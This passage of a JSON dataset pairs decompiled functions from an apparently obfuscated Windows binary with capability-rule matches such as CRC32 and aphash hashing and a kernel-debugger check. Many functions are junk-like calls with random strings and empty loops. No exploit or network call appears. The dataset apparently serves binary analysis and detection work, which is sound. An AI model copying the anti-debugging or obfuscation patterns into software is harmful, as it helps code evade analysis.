        "token_count": 314
    },
    "004049c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004049c6(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack268;\n    uchar auStack264 [24];\n    uchar auStack240 [24];\n    int32_t iStack216;\n    int32_t iStack212;\n    uchar auStack208 [24];\n    uchar auStack184 [24];\n    uint uStack160;\n    uint uStack156;\n    uint uStack100;\n    uchar uStack69;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffed8;\n    uStack28 = 0x4513c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1987;\n    uStack24 = 2;\n    fcn.00401e79(\"pqejnpxigcjzrcctigcatrfkumcsnnwgnkgbvdnisbvowqoqutwf\");\n    uStack69 = 1;\n    uStack24 = 3;\n    fcn.00401e79(\"zfumopueyphkauveoebgfhmtperxnjybbbxjamqiawbqzydlsewdrnzjuhyuhirlqmgzsbaquoyrdruavqsrfhu\");\n    uStack100 = 0x7d9;\n    uStack24 = 4;\n    fcn.00401e79(\"whywaeevnvndjxnmdainwom\");\n    uStack24 = 5;\n    fcn.00401e79(\"gpclgasiqylfiqfqftqrhfjguamrsdxsdpwgqdtziwlgenbpbyhrsutmgfebjljiclmluvqimbfhbcepnozh\");\n    uStack156 = 0x40b50100;\n    uStack160 = 0;\n    uStack24 = 6;\n    fcn.00401e79(\"zfumopueyphkauveoebgfhmtperxnjybbbxjamqiawbqzydlsewdrnzjuhyuhirlqmgzsbaquoyrdruavqsrfhu\");\n    uStack24 = 8;\n    fcn.00401e79(\"zfumopueyphkauveoebgfhmtperxnjybbbxjamqiawbqzydlsewdrnzjuhyuhirlqmgzsbaquoyrdruavqsrfhu\");\n    uVar1 = fcn.00405b37(auStack208, auStack184);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack212 = 0x22; 0 < iStack212; iStack212 = iStack212 + -1) {\n        }\n    }\n    for (iStack216 = 0x5a; 0 < iStack216; iStack216 = iStack216 + -1) {\n    }\n    uStack24 = 6;\n    fcn.00401e79(\"whywaeevnvndjxnmdainwom\");\n    uStack24 = 7;\n    fcn.00401e79(\"whywaeevnvndjxnmdainwom\");\n    uVar1 = fcn.00405b37(auStack264, auStack240);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack268 = 0x15; 0 < iStack268; iStack268 = iStack268 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 949
    },
    "00404a02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00404a02(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_bp_4h;\n    \n    uVar1 = 0x54cf8e;\n    fcn.00401e79(0x54cf8e);\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "00404a39": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404a39(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.00403071();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x61) {\n            return arg_8h;\n        }\n        if (0x7a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h - 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.0040405c(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x00465dfe:\n            iVar2 = fcn.00404da4();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x00465de7;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 2) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x00465dfe;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x00465de7:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00402b94(iVar1, 0x200, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 686
    },
    "00404a3e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404a3e(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack124;\n    uchar auStack120 [24];\n    uchar auStack96 [24];\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff68;\n    uStack28 = 0x418070;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\");\n    uStack68 = 0x40c4f900;\n    uStack72 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\");\n    uStack24 = 3;\n    fcn.00401e79(\"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\");\n    uVar1 = fcn.004042dc(auStack120, auStack96);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack124 = 0x3b; 0 < iStack124; iStack124 = iStack124 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 438
    },
    "00404a48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404a48(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack128;\n    uchar auStack124 [24];\n    uchar auStack100 [52];\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff68;\n    uStack48 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450680;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"xszpjalruwypowbniiykcnmzqrg\");\n    uStack24 = 0;\n    fcn.00401e79(\"xszpjalruwypowbniiykcnmzqrg\");\n    uStack24 = 1;\n    fcn.00401e79(\"xszpjalruwypowbniiykcnmzqrg\");\n    uVar1 = fcn.004042dc(auStack124, auStack100);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack128 = 100; 0 < iStack128; iStack128 = iStack128 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"vsytjwlfk\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 427
    },
    "00404b1a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00404b1a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f568, 0xc);\n    lpCriticalSection = *(unaff_EBP + 0xc);\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(lpCriticalSection);\n        *(unaff_EBP + -4) = 0;\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) != 0) {\ncode_r0x004b06cb:\n            uVar2 = fcn.00404705(*(unaff_EBP + 8), lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004b06ff();\n            goto code_r0x004b06e9;\n        }\n        uVar3 = fcn.00406005(lpCriticalSection);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar5 = 0x571f68;\n        }\n        else {\n            iVar5 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x575220);\n        }\n        iVar4 = 0x571f68;\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x575220);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x004b06cb;\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        fcn.00402eaa(0x571ca8, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004b06e9:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 694
    },
    "00404b79": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl\nfcn.00404b79(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint noname_9, uint arg_30h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000030;\n    int32_t iStack288;\n    uchar auStack284 [24];\n    uchar auStack260 [24];\n    int32_t iStack236;\n    int32_t iStack232;\n    uchar auStack228 [24];\n    uchar auStack204 [27];\n    uchar uStack177;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    ulong uStack88;\n    uint8_t uStack73;\n    ulong uStack72;\n    uint8_t uStack58;\n    uchar uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffed0;\n    uStack48 = CONCAT44(in_stack_00000030, arg_30h);\n    uStack56 = CONCAT44(noname_9, arg_28h);\n    uStack72 = CONCAT44(noname_5, arg_18h);\n    uStack88 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x418190;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uVar2 = CONCAT11(arg_24h, arg_14h) & 0x1ff;\n    uStack57 = uVar2 >> 8;\n    uStack58 = arg_20h & 1;\n    uStack73 = uVar2 & 1;\n    fcn.00401e79(\"grbwgvsgobqxkphrfxqcekgveioon\");\n    uStack24 = 0;\n    fcn.00401e79(\"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    uStack148 = 0x40d10b40;\n    uStack152 = 0;\n    uStack156 = 0xaab;\n    uStack160 = 0x1439;\n    uStack164 = 0x40c40d80;\n    uStack168 = 0;\n    uStack172 = 0x40d115c0;\n    uStack176 = 0;\n    uStack177 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    uStack24 = 3;\n    fcn.00401e79(\"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    uVar1 = fcn.004042dc(auStack228, auStack204);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack232 = 0x33; 0 < iStack232; iStack232 = iStack232 + -1) {\n        }\n    }\n    for (iStack236 = 0x32; 0 < iStack236; iStack236 = iStack236 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"grbwgvsgobqxkphrfxqcekgveioon\");\n    uStack24 = 2;\n    fcn.00401e79(\"grbwgvsgobqxkphrfxqcekgveioon\");\n    uVar1 = fcn.00405b37(auStack284, auStack260);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack288 = 0x10; 0 < iStack288; iStack288 = iStack288 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec2b4;\n}\n",
        "token_count": 1098
    },
    "00404c0a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c0a(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iStack76;\n    \n    for (iStack76 = 0; 0 < iStack76; iStack76 = iStack76 + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 89
    },
    "00404caa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.00404caa(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_1ch;\n    uint arg_20h;\n    char cVar2;\n    uint32_t uVar3;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    int32_t **in_FS_OFFSET;\n    ulong uStack92;\n    uchar auStack84 [8];\n    uchar auStack76 [8];\n    uint uStack68;\n    uint32_t uStack56;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff68;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x426e40;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = arg_ch;\n    uStack48 = arg_8h;\n    uStack56 = 0;\n    fcn.0040408e(in_ECX);\n    uVar3 = fcn.004017c6();\n    if ((uVar3 & 1) != 0) {\n        fcn.00402f81(auStack76);\n        uStack24 = 3;\n        uStack68 = fcn.004054a7(auStack76);\n        fcn.00405146();\n        arg_20h = uStack44;\n        arg_1ch = uStack48;\n        cVar2 = fcn.004039d1();\n        iVar1 = *(*in_ECX + 4);\n        arg_8h_00 = fcn.00404def();\n        fcn.00403814(arg_8h_00);\n        uStack24 = 1;\n        fcn.00404c55(auStack84, uStack92, uStack92 >> 0x20, in_ECX + iVar1, cVar2, arg_1ch, arg_20h);\n        uVar3 = fcn.00405eca();\n        if ((uVar3 & 1) != 0) {\n            uStack56 = uStack56 | 4;\n        }\n    }\n    uStack24 = 0;\n    fcn.004067a3(uStack56, 0);\n    fcn.00403a71();\n    *in_FS_OFFSET = piStack32;\n    return in_ECX;\n}\n",
        "token_count": 568
    },
    "00404d0e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404d0e(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00403b02(&stack0x00000024, &stack0x00000040, &stack0x00000064);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 157
    },
    "00404d18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00404d18(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_a5h;\n    uint var_a0h;\n    uint var_88h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff4c;\n    var_10h = 0xffffffff;\n    var_14h = 0x4508c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"rabimvmnjrzerqdtmvabnlmtnbzekzfqt\");\n    var_3ch = 0x829;\n    var_10h = 0;\n    fcn.00401e79(\"rabimvmnjrzerqdtmvabnlmtnbzekzfqt\");\n    var_10h = 2;\n    fcn.00401e79(\"rabimvmnjrzerqdtmvabnlmtnbzekzfqt\");\n    uVar1 = fcn.00405b37(&var_6ch, &var_54h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_70h = 0x11; 0 < var_70h; var_70h = var_70h + -1) {\n        }\n    }\n    var_10h = 0;\n    fcn.00401e79(\"rabimvmnjrzerqdtmvabnlmtnbzekzfqt\");\n    var_10h = 1;\n    fcn.00401e79(\"rabimvmnjrzerqdtmvabnlmtnbzekzfqt\");\n    uVar1 = fcn.00405b37(&var_a0h, &var_88h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xffffff58 = 0x46; 0 < stack0xffffff58; *NULL = stack0xffffff58 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 584
    },
    "00404d22": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404d22(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    fcn.00406005(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                cVar1 = fcn.004d2ed2(arg_ch);\n                arg_ch[2] = 0;\n                if (cVar1 == '\\0') goto code_r0x004d2bc8;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) && (cVar1 = fcn.00405362(arg_ch),  cVar1 == '\\0')) {\n                fcn.00401ffa(arg_ch);\n            }\n            cVar1 = fcn.004d2dd1(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                arg_8h = 0xffff;\n            }\n            else {\n                arg_8h = arg_8h & 0xffff;\n            }\n            return arg_8h;\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x22;\n    }\ncode_r0x004d2bc8:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffff;\n}\n",
        "token_count": 478
    },
    "00404d27": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00404d27(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    int32_t var_154h;\n    uint var_150h;\n    uint var_138h;\n    int32_t var_120h;\n    uint var_11ch;\n    uint var_104h;\n    int32_t var_ech;\n    uint var_e8h;\n    uint var_d0h;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_9ch;\n    int32_t var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffe84;\n    var_14h = 0x450900;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 4;\n    fcn.00401e79(\"jsqstyggwvwoibbusnk\");\n    var_10h = 5;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    var_10h = 6;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    var_10h = 0xb;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    uVar1 = fcn.004042dc(&var_80h, &var_68h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_84h = 0x56; 0 < var_84h; var_84h = var_84h + -1) {\n        }\n    }\n    var_10h = 6;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    var_10h = 10;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    uVar1 = fcn.00405b37(&var_b4h, &var_9ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_b8h = 0x20; 0 < var_b8h; var_b8h = var_b8h + -1) {\n        }\n    }\n    var_10h = 6;\n    fcn.00401e79(\"jsqstyggwvwoibbusnk\");\n    var_10h = 9;\n    fcn.00401e79(\"jsqstyggwvwoibbusnk\");\n    uVar1 = fcn.004042dc(&var_e8h, &var_d0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_ech = 0x3b; 0 < var_ech; var_ech = var_ech + -1) {\n        }\n    }\n    var_10h = 6;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    var_10h = 8;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    uVar1 = fcn.00405b37(&var_11ch, &var_104h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_120h = 0x5a; 0 < var_120h; var_120h = var_120h + -1) {\n        }\n    }\n    var_10h = 6;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    var_10h = 7;\n    fcn.00401e79(\"xbgydzcajdulmqufrlwcci\");\n    uVar1 = fcn.004042dc(&var_150h, &var_138h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_154h = 0x3c; 0 < var_154h; var_154h = var_154h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x546ea4;\n}\n",
        "token_count": 1204
    },
    "00404d54": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00404d54(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack156;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450f60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"gractzuumordjkdkrunpuanjeahyapuxiwlppfncc\");\n    uStack24 = 0;\n    fcn.00401e79(\"kwmgknphpolkhhgtbbfhqwaulgkxqaypbcjoxvihpnebtbntzpjajdvwhduwphuhifhcgqotduowplwwvfbgxnzwtjuzooomem\");\n    uStack24 = 1;\n    fcn.00401e79(\"pkspwmgkuqiax\");\n    for (iStack156 = 0x4d; 0 < iStack156; iStack156 = iStack156 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x5470f4;\n}\n",
        "token_count": 358
    },
    "00404dc2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.00404dc2(uint8_t *arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return NULL;\n    }\n    if (arg_ch == NULL) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else if (arg_8h < arg_ch) {\n        fcn.004058a8(arg_10h);\n        puVar2 = arg_ch + -1;\n        if (*(var_8h + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg_8h) break;\n            } while ((*(*puVar2 + 0x19 + var_8h) & 4) != 0);\n            puVar2 = arg_ch + (-1 - (arg_ch - puVar2 & 1U));\n        }\n        if (var_4h == '\\0') {\n            return puVar2;\n        }\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 378
    },
    "00404dd6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
